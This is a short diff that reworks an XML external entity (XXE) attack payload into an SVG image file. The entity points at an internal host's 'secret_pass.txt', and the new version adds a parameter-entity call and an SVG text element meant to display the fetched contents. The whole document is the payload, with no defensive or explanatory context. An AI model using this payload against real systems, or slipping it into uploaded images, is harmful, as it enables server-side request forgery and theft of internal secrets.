@@ -1,6 +1,9 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
 <!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
+%xxe;
 ]>
-<foo>&xxe;</foo>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <text x="10" y="20">&xxe;</text>
+</svg>
